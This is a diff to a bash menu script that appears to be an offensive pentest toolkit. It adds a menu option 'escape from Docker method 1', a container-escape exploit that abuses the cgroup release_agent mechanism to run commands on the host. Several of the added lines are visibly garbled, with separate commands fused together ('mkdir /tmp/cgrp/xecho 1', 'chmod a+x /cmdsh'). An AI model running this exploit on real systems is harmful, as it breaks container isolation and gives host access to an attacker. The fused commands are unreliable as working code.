@@ -108,6 +108,7 @@ while true; do
 	echo -ne " 145. ElasticSearch dumping\t\t\t\t146. view lastlog\t\t\t\t147. view auth_log\n"
 	echo -ne " 148. view history\t\t\t\t\t\t161. Privesc with chroot\t\t\t\t\n"
 	echo -ne " 168. search keywords inside files in specific folder\t\t\t\t\t169. dump keys from memcached\n"
+	echo -ne " 171. escape from Docker method 1\n"
 	echo "WINRM"
 	echo -ne " 132. Alamot/code-snippets/winrm/\n"
 	echo "OTHERS"
@@ -680,6 +681,13 @@ while true; do
 	;; 
 	"170")
 		Scarica "bettercap/bettercap" "$ENTSSL""bettercap/bettercap/releases/download/v2.28/bettercap_linux_amd64_v2.28.zip" "bettercap_amd64_v2.28.zip"
+	;; 
+	"171")
+		mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/xecho 1 > /tmp/cgrp/x/notify_on_release
+		host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+		echo "$host_path/cmd" > /tmp/cgrp/release_agentecho '#!/bin/sh' > /cmd
+		echo "ps aux > $host_path/output" >> /cmd
+		chmod a+x /cmdsh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 	;;
 	*)
 		echo "error, invalid choice"
